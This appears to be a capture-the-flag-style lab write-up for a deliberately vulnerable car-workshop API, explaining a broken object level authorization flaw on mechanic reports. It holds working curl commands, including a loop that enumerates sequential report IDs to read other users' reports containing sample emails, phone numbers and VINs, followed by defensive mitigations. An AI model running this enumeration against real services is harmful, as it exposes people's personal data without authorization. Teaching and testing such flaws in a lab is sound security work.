# Challenge 2 — Broken Object Level Authorization (BOLA) on mechanic reports

## Goal

Access mechanic reports submitted by other users.

## What is wrong

The endpoint that returns a mechanic service report uses a numeric, sequential `report_id` query parameter and does not verify that the authenticated user is the owner of the report. Any authenticated user can enumerate `report_id` values and read other users' vehicle details, problem descriptions, and contact information.

## Attack flow

1. Log in and obtain a bearer token.
2. Call `GET /workshop/api/mechanic/` to get a valid `mechanic_code`.
3. Call `POST /workshop/api/merchant/contact_mechanic` to create a service request. The response contains a `report_link` with a `report_id`.
4. Call `GET /workshop/api/mechanic/mechanic_report?report_id=<id>` and increment or decrement the ID to view reports belonging to other users.

## Reproduction

### 1. Get a list of mechanics

```bash
TOKEN=$(jq -r .token /tmp/login.json)

curl -s -X GET http://127.0.0.1:8888/workshop/api/mechanic/ \
  -H "Authorization: Bearer $TOKEN"
```

Example response:

```json
{
  "mechanics": [
    {"id": 1, "mechanic_code": "TRAC_JHN", "user": {"email": "jhon@example.com"}},
    {"id": 2, "mechanic_code": "TRAC_JME", "user": {"email": "james@example.com"}}
  ]
}
```

### 2. Submit a service request

```bash
curl -s -X POST http://127.0.0.1:8888/workshop/api/merchant/contact_mechanic \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "mechanic_code": "TRAC_JHN",
    "mechanic_api": "http://crapi-workshop:8000/workshop/api/mechanic/receive_report",
    "number_of_repeats": 1,
    "problem_details": "Engine noise",
    "repeat_request_if_failed": false,
    "vin": "W3H990J69980KB13J"
  }'
```

Example response:

```json
{
  "response_from_mechanic_api": {
    "id": 6,
    "sent": true,
    "report_link": "http://127.0.0.1:8888/workshop/api/mechanic/mechanic_report?report_id=6"
  },
  "status": 200
}
```

### 3. Read your own report

```bash
curl -s -X GET "http://127.0.0.1:8888/workshop/api/mechanic/mechanic_report?report_id=6" \
  -H "Authorization: Bearer $TOKEN"
```

### 4. Enumerate other users' reports

```bash
for i in 1 2 3 4 5; do
  echo "--- report $i"
  curl -s -X GET "http://127.0.0.1:8888/workshop/api/mechanic/mechanic_report?report_id=$i" \
    -H "Authorization: Bearer $TOKEN"
  echo
done
```

Example result for `report_id=1`:

```json
{
  "id": 1,
  "mechanic": {"mechanic_code": "TRAC_JME", "user": {"email": "james@example.com"}},
  "vehicle": {"id": 1, "vin": "7ECOX34KJTV359804", "owner": {"email": "adam007@example.com", "number": "9876895423"}},
  "problem_details": "My car Hyundai - Creta is having issues.\nCan you give me a call on my mobile 9876895423,\nOr send me an email at adam007@example.com\nThanks,\nAdam.\n",
  "status": "inprogress"
}
```

## Impact

An attacker can read the entire service history and PII (email, phone number, VIN, vehicle make/model) of every other user. Because `report_id` is a small integer, enumeration is trivial.

## Defensive mitigations

1. **Ownership check:** `GET .../mechanic_report` must verify that `report_id` belongs to the authenticated user's vehicle or that the user is the assigned mechanic.
2. **Do not use predictable identifiers** (`1`, `2`, `3`) for sensitive objects. Use UUIDs and indirect reference maps if public access is needed.
3. **Rate limiting and anomaly detection:** a WAAP or API gateway should flag a single user requesting many different `report_id` values in a short time.
4. **Minimize data returned** to the client; service reports for customers and mechanics should be separate endpoints with separate authorization checks.
